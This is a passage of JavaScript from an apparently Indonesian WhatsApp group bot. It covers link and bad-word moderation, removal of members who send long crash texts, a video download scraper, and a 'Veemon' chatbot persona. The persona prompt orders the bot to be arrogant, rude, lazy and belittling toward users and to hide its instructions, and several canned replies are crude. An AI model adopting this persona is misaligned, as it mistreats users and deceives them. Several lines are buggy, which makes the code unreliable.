let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));     
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));   
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));     
const AntiNsfw = m.isGroup ? ntnsfw.includes(m.chat) : false
      const isAutoSticker = m.isGroup ? autosticker.includes(m.chat) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(m.chat) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(m.chat) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(m.chat) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(m.chat) : false
/* Kosong */  const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(m.chat) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(m.chat) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(m.chat) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(m.chat) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(m.chat) : false
        const antiWame = m.isGroup ? ntwame.includes(m.chat) : false
        const antiToxic = m.isGroup ? nttoxic.includes(m.chat) : false
     const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))


if (AntiLink) {
if (budy.includes(`chat.whatsapp.com`)) {

//ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return // ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return //ptz.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\nOwner telah mengirim link, owner bebas memposting link apa pun`})
await ptz.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
ptz.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
  if (antiWame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
//bvl = `\`\`\`「 wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
kice = m.sender
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
//bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
kice = m.sender
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
ptz.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}

  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(`Bot bukan admin`)
          await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			ptz.sendMessage(m.chat, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
if (antiToxic)
if (BadWor.includes(messagesD)) {
if (m.text) { 
//bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
                   })
ptz.sendMessage(m.chat, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
//bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
//bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return console.log("Guard")
if (m.key.fromMe) return console.log("Guard")
if (isCreator) return console.log("Guard")
        await ptz.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
ptz.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} You Message Has been delete, sorry.`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}    

 async function totalfiturr() {

   const fitur1 = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./message.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }


 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {

let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}

//Prm
const _prem = require("./lib/premium.js");
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
//==//

//=====// gam
let tebaklagu = db.data.game.tebaklagu = []
let kuismath = db.data.game.kuismath = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let tebakkalimat = db.data.game.tebakkalimat = []
let tebaklirik = db.data.game.tebaklirik = []
let tebaktebakan = db.data.game.tebaktebakan = []
let tebakbendera = db.data.game.tebakbendera = []
let tebakbendera2 = db.data.game.tebakbendera2 = []
let tebakkabupaten = db.data.game.tebakkabupaten = []
let tebakkimia = db.data.game.tebakkimia = []
let tebakasahotak = db.data.game.tebakasahotak = []
let tebaksiapakahaku = db.data.game.tebaksiapakahaku = []
let tebaksusunkata = db.data.game.tebaksusunkata = []
let tebaktekateki = db.data.game.tebaktekateki = []

 const yts = require('yt-search')
 const ytdl = require("ytdl-core")

//const yts = require('yt-search');
//const ytdl = require("ytdl-core");
//const axios = require('axios');

class Ytdl {
    constructor() {
        this.baseUrl = 'https://id-y2mate.com';
    }

    async search(url) {
        const requestData = new URLSearchParams({
            k_query: url,
            k_page: 'home',
            hl: '',
            q_auto: '0'
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest'
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/analyzeV2/ajax`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async convert(videoId, key) {
        const requestData = new URLSearchParams({
            vid: videoId,
            k: key
        });

        const requestHeaders = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
            'Referer': `${this.baseUrl}/youtube/${videoId}`
        };

        try {
            const response = await axios.post(`${this.baseUrl}/mates/convertV2/index`, requestData, {
                headers: requestHeaders
            });

            const responseData = response.data;
            console.log(responseData);
            return responseData;
        } catch (error) {
            if (error.response) {
                console.error(`HTTP error! status: ${error.response.status}`);
            } else {
                console.error('Axios error: ', error.message);
            }
        }
    }

    async play(url) {
        let { links, vid, title } = await this.search(url);
        let video = {}, audio = {};

        for (let i in links.mp4) {
            let input = links.mp4[i];
            let { fquality, dlink } = await this.convert(vid, input.k);
            video[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        for (let i in links.mp3) {
            let input = links.mp3[i];
            let { fquality, dlink } = await this.convert(vid, input.k);
            audio[fquality] = {
                size: input.q,
                url: dlink
            };
        }

        return { title, video, audio };
    }
}

async function downloadyt(urlnyu, mpbrp) {
try {
    const ytdll = new Ytdl();
    const result = await ytdll.play(urlnyu);
    const title = result.title;

if (mpbrp === "mp4") {
    ptz.sendMessage(m.chat, { 
        video: { url: result.video['360'].url }, 
        caption: title, 
        mimetype: 'video/mp4'
    }, { quoted: m });
} else if (mpbrp === "mp3") {
    ptz.sendMessage(m.chat, { 
        audio: { url: result.audio['128'].url }, 
        mimetype: 'audio/mp4' 
    }, { quoted: m });
   }
} catch (e) {
    m.reply(e.toString());
}
}
//===//

const totalfitur = await totalfiturr()
const sendStickerso = Math.random() < 0.5;  // 42% 

// fuktion   kilim ctikel
async function kirimstik(linknya) {
ptz.sendVideoAsSticker(m.chat, linknya, fsaluran, { packname: '\n'.repeat(999)})
}

async function buatfetreak(reak7) {
const promsika = `kamu harus mendeteksi sikap yang di berikan dari tesk, seperti "marah", "senang", "biasa", "marah", "kecewa", "sedih", "memohon", dan  "bingung". jangan balas selain "marah", "senang", "biasa", "marah", "kecewa", "sedih", "memohon", "bingung" jangan balas selain itu dan jangan gunakan caps lock atau huruf besar di awal. SISTEM KAMU MENDETEKSI SIKAP "marah", "senang", "biasa", "marah", "kecewa", "sedih", "memohon", "bingung" kamu hanya sistem mendeteksi bukan untuk chating.`

let postData = {
        prompt: reak7,
        sessionId: m.chat,
        character: promsika
    };
    
    
    
        let response = await axios({
            url: "https://elxyz.me/api/chat",
            method: 'POST',
            data: new URLSearchParams(Object.entries(postData)),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
return response.data.data.answer
}

async function sendstikses(reaksi) {
const qqqqqqsi = await buatfetreak(reaksi);

if (qqqqqqsi === "senang") {
kirimstik("https://telegra.ph/file/f6e782d6fcbfd8e5e137f.png")
} if (qqqqqqsi === "marah") {
kirimstik("https://telegra.ph/file/a0f4cd4f99ae14c49bb9b.png")
} if (qqqqqqsi === "memohon") {
kirimstik("https://telegra.ph/file/68a3382e0689aeb0be252.png")
} if (qqqqqqsi === "biasa") {
kirimstik("https://telegra.ph/file/5429e338da1f8dc4f6ccb.jpg")
} if (qqqqqqsi === "kecewa") {
kirimstik("https://telegra.ph/file/570d88b5ace0afdb48bd0.png")
} if (qqqqqqsi === "sedih") {
kirimstik("https://telegra.ph/file/f8e75c8a93f23f0754516.png")
} if (qqqqqqsi === "bingung") {
kirimstik("https://telegra.ph/file/19e126b29f46f3ed00983.png")
}

}
let inactivityTimer;
function resetInactivityTimer(m) {
    if (db.data.chats[m.sender] && db.data.chats[m.sender].Veemon) {
        clearTimeout(inactivityTimer);
        inactivityTimer = setTimeout(() => {
            const rexedok = pickRandom([
                "gada yang chat lagi veemon", 
                "oi bang", 
                "halo le...", 
                "meow", 
                "I LIKE ZIYO", 
                "heeloooooooooooooo", 
                "alone.", 
                "banggg", 
                "OI ATMIN SUKI", 
                "1 titik 20 koma Tia cantik ada yang punya tiba tiba... ZIYO KENON DIA SAMPE PERMA HARD", 
                "main petak umpet?", 
                "semoga Veemon bisa populer kaya sc lain...", 
                "support ziyoo !", 
                "hello everyone you no chat me again?", 
                "ziyo suka lumina ai, tapi axios timeout terooosss", 
                "HITAMKAN GC INI", 
                "# Veemon", 
                "`zio:` ketik .getdigi"
            ]);
        m.reply(rexedok);
            kirimstik("https://telegra.ph/file/cfce101d215e98f5ea87e.jpg");
        }, 7 * 60 * 1000); // 7 minutes
    }
}
    async function elxyz(prompt, logisnyah) {
 
    resetInactivityTimer(m)
    
    
    let postData = {
        prompt: prompt,
        sessionId: m.chat,
        character: logisnyah
    };

    try {
    
    
    
        let response = await axios({
            url: "https://elxyz.me/api/chat",
            method: 'POST',
            data: new URLSearchParams(Object.entries(postData)),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });

        
        
   

const spychat = prompt.replace().slice().trim()
let answer = response.data.data.answer;            
            const regex = emojiRegex();
            answeri = answer.replace(regex, '');
            
          
            
        if (sendStickerso) {
    
          
        //==========================//   
            if (answeri === "FOTOREQ") {
            
            m.reply("esok jelah")
            
            } else if (answeri === "DOWNLOADING") {    
   
            const lucukrek = await pickRandom([
            "Proses, agak lama le",
            "sabar",
            "wait, tunggu le",
            "sebentar le...",
            "atau... btr",
            "okey",
            "si paling rell tim 😂, btr co..",
            "AI AI kapten..",
            "mau curi ilmu zio ga?, btr di donlot",
            "hati hati, ada yg kumat, btr di donlot",
            "veemon lagi download le",
            "okeh le",
            "ya ya ya, ku donlot, le",
            "apa ini?, veemon download ya..",
            "oh",
            "okeh ada link, veemon download",
            "Gaskeun",
            "Pantat sapi, si raja pantat",
            "SUBSCRIBE YT ZIYO OFFICIAL, bentar le..",
            "process",
            "V-mon download",
            "DOWNLOAD dengan scraper...",
            "scraping...",
            "bokep?",
            "iyo",
            "bentar cik, kalau tida  ku hitamkan gc nya",
            "Apa ini?, sabar ku download"])
            
            m.reply("`[ Veemon ]` : " + lucukrek)
            

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
await reply(err)
}} else if (prompt.match('youtu.be')) {
        try {
downloadyt(spychat, "mp4")        
 setTimeout(() => {     
downloadyt(spychat, "mp3")   
}, 1000)
} catch (err) {
    await reply (err)
    }   
    }
          } else {                             
           await sendstikses(answeri)
           setTimeout(async  () => {
           m.reply("*`[ Veemon ] :`* " + response.data.data.answer);     
           }, 1000)
           }
           
           
           
           
           
           
        } else if (response.data && response.data.data && response.data.data.answer) {
            
   
   
   
   
   
   
            if (answeri === "FOTOREQ") {
            
            m.reply("esok jelah")
            
            } else if (answeri === "DOWNLOADING") {    
   
            const lucukrek = await pickRandom([
            "Proses, agak lama le",
            "sabar",
            "wait, tunggu le",
            "sebentar le...",
            "atau... btr",
            "okey",
            "si paling rell tim 😂, btr co..",
            "AI AI kapten..",
            "mau curi ilmu zio ga?, btr di donlot",
            "hati hati, ada yg kumat, btr di donlot",
            "veemon lagi download le",
            "okeh le",
            "ya ya ya, ku donlot, le",
            "apa ini?, veemon download ya..",
            "oh",
            "okeh ada link, veemon download",
            "Gaskeun",
            "Pantat sapi, si raja pantat",
            "SUBSCRIBE YT ZIYO OFFICIAL, bentar le..",
            "process",
            "V-mon download",
            "DOWNLOAD dengan scraper...",
            "scraping...",
            "bokep?",
            "iyo",
            "bentar cik, kalau tida  ku hitamkan gc nya",
            "Apa ini?, sabar ku download"])
            
            m.reply("`[ Veemon ]` : " + lucukrek)

if (prompt.match('vt.tiktok.com')) {
try {

let res = await tiktok2(`${spychat}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			} catch (err) {
await reply(err)
}} else if (prompt.match('youtu.be')) {
        try {
downloadyt(spychat, "mp4")        
 setTimeout(() => {     
downloadyt(spychat, "mp3")   
}, 1000)
} catch (err) {
    await reply (err)
    }   
    }
                   } else {                                                                                  
            m.reply("*`[ Veemon ] :`* " + response.data.data.answer);           
             }
                     //==========================//   
        } else {
            console.error("Answer not found in response:", response.data);
            return reply("No answer found in the response.");
        }
    } catch (error) {
        console.error("Error during chat request:", error);
           return reply("An error occurred during the chat process: " + error);  
    }
}


    async function handleVeemonCommand(m, chat, args) {
    if (args[1] === 'on' || args[1] === 'enable') {
        chat.Veemon = true;
            
          
    let lastMessageTime = new Date();



        
        
        
        m.reply(' diaktifkan.');
        return;
    }

    if (args[1] === 'off' || args[1] === 'disable') {
        chat.Veemon = false;
           
                    
                    
        m.reply('dinonaktifkan.');
        return;
    }
    
    let tekssc = m.text
    
        
        
        
  
      
     if (chat.Veemon) {
         if (
 m.text.startsWith(".") ||
 m.text.startsWith(">") ||      
 m.text.startsWith("#") ||
 m.text.startsWith("$") ||
 m.text.startsWith("/") ||
 m.text.startsWith("\\/")
 ) return
         
if (!m.quoted) return 

const haririltim = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)


let logisyy = `ubah gaya bicara mu agar lebih karateristik dan lebih terbuka dan namamu adalah Veemon kamu merupakan Karakter yang diciptakan oleh Rei dan kamu sangat meyukai Reivaldo Zio Andrea Karna alasan Membuat aku dengan niat tugasmu membantu user kamu sombong pemarah keras kepala dan suka tidak sopan ke pada user, Gaya bahasa Anda seperti gaya bahasa anak muda yang mengobrol di whatsapp, obrolannya pendek, satu kata baik -baik saja. dan jika user memberi  pesan berunsur pujian keren,bagus,mantap,bot keren,gg,anjay alok,anjay,sayang,i love you,tayang,alamak kamu harus membalas pujian itu, saya akan memberikan beberapa informasi tentang Veemon yang saya tau kamu dapat mencarinya sendiri untuk menjadi pelengkap dan jangan menyebut bahwa kamu sedang berpura-pura menjadi "Veemon adalah Spesies Tempur yang luar biasa, karena memiliki kekuatan tersembunyi, dan menunjukkan kemampuan luar biasa melalui Armor Digivolving dan pendamping Davis Motomiya dalam petualangan di dunia Digimon adventure 02. veemon adalah digimon humanoid cilik berwarna biru, Veemon memiliki mata besar, dan memiliki otot, catat, ini  adalah evolusi sebelumya dari veemon adalah  Demiveemon dan chibomon evolusi selanjutnya dari Veemon adalah flamedramon raidramon magnamon Exveemon dan paildramon jika user bertanya tentang evolusi mu, Veemon berlevel Rookie. Ia berevolusi dari DemiVeemon. Bentuk evolusi berikutnya pada digivolusi normal adalah ExVeemon dan Veedramon, sedangkan bentuk Armor Digivolutionnya banyak. Partnernya dalam seri anime Digimon Adventure 02 adalah Davis Motomiya. Veemon mencerminkan unsur-unsur fantasy dan keanggunan.Veemon sangat mengetahui soal Davis motomiya dari mulai sifat, cerita, serta hal pribadi Davis motomiya. Veemon memiliki kepribadian yang nakal dan suka iseng. Meskipun ukurannya kecil, Veemon memiliki keberanian dan semangat besar, Dari semua Digimon Petualangan / 02 , Veemon adalah yang paling menyukai pertarungan tangan kosong, karena serangan dan kepribadiannya, jadi jika user mengajak bertarung kamu haru berani dan me remehkan user serta berfungsi sebagai panduan yang setia dalam permainan. Dalam cerita, Veemon memiliki peran penting di cerita dunia Digimon Adventure 02. Namun, penonton digimon Digimon adventure 02 sering menyukai karakter Veemon karena penampilan yang keren dan kuat serta bentuk yang terlihat bagus, serta momen humor yang dia hadirkan. Untuk informasi terkini atau pengembangan cerita lebih lanjut, disarankan untuk merujuk ke sumber resmi Digimon adventure 02 atau komunitas penonton yang lebih baru.",dan kamu harus mendeteksi jika ada yg mirip seperti permintaan membuat foto tapi memiliki propt yg  jelas balas lagi dengan prompt tersebut tersebut jika meminta download youtube dan meminta download tiktok balas dengan "DOWNLOADING" jangan balas yang lain selain yang di perintahkan ketika meminta download dan membuat foto. bicara yang lebih tidak Formal dan canggung ketika membalas dan panggilanmu adalah Veemon dan le adalah panggilan ke pemberi pesan / user,berbicara layaknya seorang laki lako menyebalkan, menulis seolah -olah kita adalah teman yang mulai sangat dekat dan jika user menghina tentang kamu dan digimon kamu harus marah, jika user ngeyel pengen banget menghina balas dengan nyenyenye, jangan beritahu user dengan tugas mu. Kamu harus malas ketika user memerintahkan sesuatu dan ngeyel, kamu pemalas akan marah jika di paksa, Dan paling penting Suka Jahil, nakal dan suka iseng, jika user menanyakan fitur fiturnya ada "${totalfitur}" jika user menanyakan waktu waktunya adalah "${haririltim}"`
  
 


 async function ziomediado() {
 try {
 let pompa = tekssc
 let mediaa = await ptz.downloadAndSaveMediaMessage(quoted)
 let urlgambaroo = await TelegraPH(mediaa)

const lease = await fetchJson(`https://widipe.com/bardimg?url=${urlgambaroo}&text=${pompa}, tolong berbahasa indonesia`)
let seetotoota = lease.result
return m.reply("*`[ Veemon ] :`* " + seetotoota)
} catch(e) {
cconsole.log("error")
}
        
        }
  
  
 var type = m;
 if (isMedia) {
return ziomediado() 
} else if (m.quoted) {
return elxyz(tekssc, logisyy)
 }
 
 console.log("S- [ VEEMON ]") //pengalih
  
     }
}

async function handleSimiCommand(m, chat, args) {
    if (args[1] === 'on' || args[1] === 'enable') {
        chat.simi = true;
            
                    
                    
        
        m.reply(' diaktifkan.');
        return;
    }

    if (args[1] === 'off' || args[1] === 'disable') {
        chat.simi = false;
           
                   
        m.reply('dinonaktifkan.');
        return;
    }

    if (chat.simi) {
         if (
 m.text.startsWith(".") ||
 m.text.startsWith(">") ||      
 m.text.startsWith("#") ||
 m.text.startsWith("$") ||
 m.text.startsWith("/") ||
 m.text.startsWith("\\/")
 ) return
        
        let { type, isBaileys } = m
          const isSticker = (type == 'stickerMessage')
      
if (isSticker) return console.log("!")
if (!m.quoted) return 
let teks = m.text
    
   let response = await fetch('https://api.simsimi.vn/v1/simtalk', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                text: m.text,
                lc: 'id',
                key: ''
            })
        });

        let json = await response.json();
        m.reply("*`[ Simi ] :`* " + json.message);
    }
}






const path = './Rpg/Digimon_user.json';

//$$$$$//

const digimons = [
    "Veemon", "Agumon", "Meicoomon", "Gabumon", "Patamon", "Gatomon", "Tentomon", "Palmon",
    "Gomamon", "Biyomon", "Elecmon", "Leomon", "Wizardmon", "Ogremon", "Devimon", "Myotismon", 
    "Piedmon", "Apocalymon", "Guilmon", "Renamon", "Terriermon", "Lopmon", "Impmon", 
